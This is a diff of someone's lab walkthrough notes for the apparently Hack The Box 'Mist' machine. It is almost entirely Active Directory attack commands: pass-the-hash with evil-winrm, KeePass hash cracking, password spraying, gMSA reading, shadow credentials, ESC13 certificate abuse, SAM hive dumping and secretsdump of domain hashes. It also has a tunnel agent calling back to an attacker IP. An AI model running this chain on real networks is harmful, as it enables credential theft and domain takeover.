@@ -64,10 +64,42 @@ export KRB5CCNAME=ms01.ccache
 
 proxychains secretsdump.py administrator@ms01.mist.htb -k -no-pass -> ntlm hash of admin
 (In my case, it didn't work, so I set up ligolo, sudo ntpdate dc01 and run without proxychains)
-sudo ip tuntap add user parrot mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert
-.\agent.exe --connect 10.10.16.76:11601 -ignore-cert
-interface_add_route --name ligolo --route 192.168.100.101/24
-interface_route_del
-start
+
+-- ms01 administrator to dc01 user
+evil-winrm -i ms01 -u 'Administrator' -H '<ntlm>'
+In C:\Users\, there's another user Sharon.Mullard
+tree C:\Users\Sharon.Mullard /f -> download sharon.kdbx and 2 images
+sudo apt install keepassxc
+keepassxc open sharon.kdbx - need password
+keepass2john sharon.kdbx > sharon.hash
+hashcat sharon.hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a' -> get the keepass password -> open keepass and get <password>  #?a is all characters
+
+nxc smb dc01 -u 'brandon.keywarp' -H '<brandon ntlm>' --users -> save usernames to users.txt
+nxc smb dc01 -u users.txt -p <password> --continue-on-success -> verify it's for op_sharon.mullard -> can evil-winrm
+
+-- until get domain admin
+op_sharon.mullard --- ReadGMSAPassword(Can read gmsa) --- svc_ca$ --- AddKeyCredentialLink(Can set shadow cred) --- svc_cabackup
+nxc ldap dc01 -u op_sharon.mullard -p '<password>' --gmsa -> get ntlm hash of svc_ca$
+certipy shadow auto -u 'svc_ca$@mist.htb' -hashes ':<ntlm>' -account svc_cabackup -dc-ip 192.168.100.100 -> get ntlm hash of svc_cabackup
+
+
+                                                                      ManagerAuthentication                             BackupSvcAuthentication
+                                                                                |                                                   |
+svc_cabackup member of certificate services --- esc13 --- certificate managers member of ca backup --- esc13 --- service account member of backup operators
+(These commands may need -debug switch to work well)
+
+certipy req -u svc_cabackup -hashes ':<ntlm>' -ca 'mist-DC01-CA' -template ManagerAuthentication -dc-ip 192.168.100.100 \
+-dns 192.168.100.100 -key-size 4096 -> get svc_cabackup.pfx for managerauthentication
+certipy auth -pfx svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100 -> get svc_cabackup.kirbi
+impacket-ticketConverter svc_cabackup.kirbi svc_cabackup.ccache
+
+KRB5CCNAME=svc_cabackup.ccache certipy req -u svc_cabackup -k -no-pass -ca 'mist-DC01-CA' -template BackupSvcAuthentication \
+-dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096 -target DC01.mist.htb -> get svc_cabackup.pfx for backupsvcauthentication
+certipy auth -pfx svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100 -> get svc_cabackup.kirbi
+impacket-ticketConverter svc_cabackup.kirbi svc_cabackup.ccache
+KRB5CCNAME=svc_cabackup.ccache impacket-reg -k -no-pass -dc-ip 192.168.100.100 mist.htb/svc_cabackup@dc01.mist.htb backup -o C:\Users\op_sharon.mullard\Documents
+-> Backup sam hive to documents folder. evil-winrm to op_sharon.mullard and download these files.
+
+secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save -> Get DC01 local user hashes, but evil-winrm to administrator cannot succeed with it. Copy DC01 ntlm
+secretsdump.py 'DC01$@192.168.100.100' -hashes ':<dc01$ ntlm>' -just-dc-ntlm -> Get DC01 AD user hashes and administrator hash is valid this time.
+evil-winrm -i dc01 -u Administrator -H '<admin ntlm>>'
